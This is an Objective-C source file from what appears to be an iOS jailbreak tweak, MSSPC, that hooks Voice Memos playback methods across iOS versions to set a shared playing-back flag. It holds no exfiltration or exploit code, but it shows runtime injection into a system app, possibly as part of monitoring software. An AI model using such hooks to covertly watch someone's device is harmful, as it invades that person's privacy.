//
//  AudioVoiceMemo.h
//  MSSPC
//
//  Created by Makara Khloth on 4/25/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSSPC.h"
#import "AudioHelper.h"
#import "RCAVPreviewController.h"
#import "RCPreviewController.h"
#import "RCSavedRecordingPreviewController.h"
#import "AVPlayerController.h"

#pragma mark - Below iOS 7 -

HOOK(AVController, pause, void) {
	DLog(@"--------------------------- AVController --> pause ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(AVController, pause);
}

HOOK(AVController, playNextItem$, BOOL, NSError **error) {
	DLog(@"--------------------------- AVController --> playNextItem ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:YES];
    return CALL_ORIG(AVController, playNextItem$, error);
}

HOOK(AVController, play$, BOOL, NSError **error) {
	DLog(@"--------------------------- AVController --> play ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:YES];
    return CALL_ORIG(AVController, play$, error);
}

#pragma mark - iOS 7 -

HOOK(RCAVPreviewController, playOrRestart, void) {
	DLog(@"--------------------------- RCAVPreviewController --> playOrRestart ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:YES];
    return CALL_ORIG(RCAVPreviewController, playOrRestart);
}

HOOK(RCAVPreviewController, pause, void) {
	DLog(@"--------------------------- RCAVPreviewController --> pause ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(RCAVPreviewController, pause);
}

HOOK(RCAVPreviewController, stop, void) {
	DLog(@"--------------------------- RCAVPreviewController --> stop ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    return CALL_ORIG(RCAVPreviewController, stop);
}

HOOK(RCAVPreviewController, _handleDidStopPlaybackWithError$, void, id arg1) {
	DLog(@"--------------------------- RCAVPreviewController --> _handleDidStopPlaybackWithError$ ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(RCAVPreviewController, _handleDidStopPlaybackWithError$, arg1);
}

#pragma mark - iOS 8 -

/*
// This method does not call in iOS 8
HOOK(RCPreviewController, playOrRestart, void) {
	DLog(@"--------------------------- RCPreviewController --> playOrRestart ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:YES];
    return CALL_ORIG(RCPreviewController, playOrRestart);
}*/

HOOK(RCPreviewController, playWithTimeRange$startTime$, void, SCD_Struct_RC1 arg1, double arg2) {
	DLog(@"--------------------------- RCPreviewController --> playWithTimeRange$startTime$ ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:YES];
    CALL_ORIG(RCPreviewController, playWithTimeRange$startTime$, arg1, arg2);
}

HOOK(RCPreviewController, pause, void) {
	DLog(@"--------------------------- RCPreviewController --> pause ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(RCPreviewController, pause);
}

HOOK(RCPreviewController, stop, void) {
	DLog(@"--------------------------- RCPreviewController --> stop ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(RCPreviewController, stop);
}

HOOK(RCPreviewController, _handleDidStopPlaybackWithError$, void, id arg1) {
	DLog(@"--------------------------- RCPreviewController --> _handleDidStopPlaybackWithError$ ---------------------------");
	[[AudioHelper sharedAudioHelper] setMIsVoiceMemoPlayingBack:NO];
    CALL_ORIG(RCPreviewController, _handleDidStopPlaybackWithError$, arg1);
}
